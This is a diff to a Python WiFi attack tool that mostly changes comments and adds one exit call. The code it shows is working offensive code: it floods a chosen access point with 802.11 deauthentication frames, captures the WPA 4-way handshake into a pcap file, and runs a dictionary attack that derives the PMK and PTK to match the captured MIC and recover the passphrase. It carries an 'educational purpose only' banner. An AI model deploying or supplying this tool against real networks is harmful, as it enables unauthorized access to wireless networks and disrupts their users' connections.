@@ -17,7 +17,7 @@ import time
 import string
 
 
-#Gloabal variables and banner:
+#Global variables and banner:
 ap_list = []
 cli_list = []
 to_frames = []
@@ -75,7 +75,7 @@ Use for educational purpose only.
 
 
 #######################################
-#   WIRELESS RELATED FUNCTIONS        #
+#     GLOBAL PROGRAM FUNCTIONS        #
 #######################################
 
 #Handle the ctrl+C to disable the monitoring mode and restore network adapter.
@@ -138,6 +138,10 @@ def enable_monitoring(interface_name):
         print(e)
 
 
+####################################
+#       SNIFFING FUNCTION          #
+####################################
+
 # Determines the encrytption type of the AP
 def get_encrytion(p):
 
@@ -165,7 +169,7 @@ def get_encrytion(p):
     return enc
 
 
-#802.11 Packet Handler
+#802.11 Packet Handler to discover new AP
 def packet_handler(packet):
     try:
         if packet.addr2 not in ap_list_temp and packet.type == 0 and packet.subtype == 8:
@@ -215,10 +219,9 @@ def deauth(ap):
     # send the packet
     sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)
 
-#This function is checking if the handshake is in the packet p.
-#It is saving the EAPOL paquet into a pcap file for later crack
+#This function is checking if paquet contains EAPOL protocol.
+#It is saving the EAPOL paquet into a pcap file for later crack.
 #Return TRUE if the handshake was grabbed successfully.
-#This function is used in the grab_handshake function when sniffing.
 def checkForWPAHandshake(p):
     pktdump =  PcapWriter('./handshake/handshake.pcap',append=True,sync=True)
     if EAPOL in p:
@@ -236,9 +239,9 @@ def checkForWPAHandshake(p):
 
         idx = cli_list.index(client)
         if to_ds:
-            to_frames[idx] = to_frames[idx] + 1
+            to_frames[idx] = to_frames[idx] + 1 #AP -> CLI
         else:
-            from_frames[idx] = from_frames[idx] + 1
+            from_frames[idx] = from_frames[idx] + 1 #CLI -> AP
         # See if we captured 4 way handshake
         if (to_frames[idx] == 2) and (from_frames[idx] == 2):
             captured_handshake = True
@@ -254,18 +257,24 @@ def checkForWPAHandshake(p):
 #The pcap file can then be used to crack the password.
 def grab_handshake(ap):
     if os.path.isfile("./handshake/handshake.pcap"):
-        os.system("rm ./handshake/handshake.pcap")
+        os.system("rm ./handshake/handshake.pcap") # In case the program was shutdown in the process
     os.system("clear")
     print("Switching to channel " + str(ap.channel))
     os.system("iw dev "+ interface + " set channel %d" % ap.channel)
     print("Sniffing " + ap.ssid + "...")
     signal.signal(signal.SIGINT,signal_handler2)
-    #Deauth the AP in a thread
+
+    #Deauth the AP in a thread#
     from threading import Thread
     t = Thread(target=deauth,args=(ap, ))
     t.start()
+    ############################
+
+
 
     p = sniff(iface=interface, stop_filter=checkForWPAHandshake) #Sniff for handshake
+
+    #Out of the sniff function -> checkForWPAHandshake = True => Handshake grabbed
 
     print(TGREEN + "!Handshake Grabbed!" + TWHITE)
     t.join()
@@ -273,7 +282,7 @@ def grab_handshake(ap):
 
 #This is the handshake_grabber main function.
 #It is asking the user to select the AP they want to sniff
-#Then trigger the grab_handshake function to start the capture
+#Then triggers the grab_handshake function to start the capture
 def handshake_grabber():
     signal.signal(signal.SIGINT, signal.SIG_DFL)
     if len(ap_list) == 0:
@@ -301,7 +310,7 @@ def handshake_grabber():
 #       CRACKING FUNCTIONS          #
 #####################################
 
-#This function is going to calculate the trans key
+#This function is going to calculate the PTK
 def calc_ptk(key, A, B):
     blen = 64
     i = 0
@@ -314,7 +323,7 @@ def calc_ptk(key, A, B):
 
     return R[:blen]
 
-#This function is going to fabricate the pairwise master key
+#This function is going to fabricate the pairwise master key from the psk/ssid using a PRF
 def calc_pmk(ssid, password):
     pmk = hashlib.pbkdf2_hmac('sha1', password.encode('ascii'), ssid.encode('ascii'), 4096, 32)
     return pmk
@@ -332,6 +341,7 @@ Do the above steps until the C_MIC = F_MIC
 """
 
 def crack_handshake(ap_ssid,pcap,wordlist):
+    #Isolate the field we need from the PCAP hanshake
     os.system("clear")
     packets = rdpcap(pcap)
     ssid = ap_ssid
@@ -343,23 +353,28 @@ def crack_handshake(ap_ssid,pcap,wordlist):
     anonce = packets[0].load[13:45]
     snonce = packets[1].load[13:45]
 
+    #Contructing the key data field
     key_data = min(mac_ap, mac_cl) + max(mac_ap, mac_cl) + min(anonce, snonce) + max(anonce, snonce)
 
+    #Getting the sniffed MIC from the client
     message_integrity_check = binascii.hexlify(packets[1][Raw].load)[154:186]
 
+    #Constructing the WPA data field with zeroed MIC
     wpa_data = binascii.hexlify(bytes(packets[1][EAPOL]))
     wpa_data = wpa_data.replace(message_integrity_check, b"0" * 32)
     wpa_data = binascii.a2b_hex(wpa_data)
+
+    #Cracking process can begin
     print("Opening " + wordlist + "...")
-    words =  open(wordlist,'r',encoding = "ISO-8859-1")
+    words =  open(wordlist,'r',encoding = "ISO-8859-1") #Open the wordlist
     print("Crack in progress...")
     for psk in words.readlines():
         psk = psk.replace("\n","")
-        pairwise_master_key = calc_pmk(ssid, psk)
-        pairwise_transient_key = calc_ptk(pairwise_master_key, pke, key_data)
-        mic = hmac.new(pairwise_transient_key[0:16], wpa_data, "sha1").hexdigest()
+        pairwise_master_key = calc_pmk(ssid, psk) #Calculate the PMK with tried psk
+        pairwise_transient_key = calc_ptk(pairwise_master_key, pke, key_data) #calculating the PTK with the PMK result
+        mic = hmac.new(pairwise_transient_key[0:16], wpa_data, "sha1").hexdigest()  #Calculate the MIC with the PMK,wpa_data to try and get the same MIC as sniffed
 
-        if mic[:-8] == message_integrity_check.decode():
+        if mic[:-8] == message_integrity_check.decode(): #Compare the MICs
             print("[KEY FOUND] : " + psk)
             print("PMK : ",end="")
             print(pairwise_master_key.hex())
@@ -377,7 +392,9 @@ def crack_handshake(ap_ssid,pcap,wordlist):
             signal_handler(None,None)
             exit(1)
     print("KEY NOT FOUND...")
+    exit(1)
 
+#Handshake cracker user intraction function
 def handshake_cracker():
     signal.signal(signal.SIGINT, signal.SIG_DFL)
     path = './handshake/'
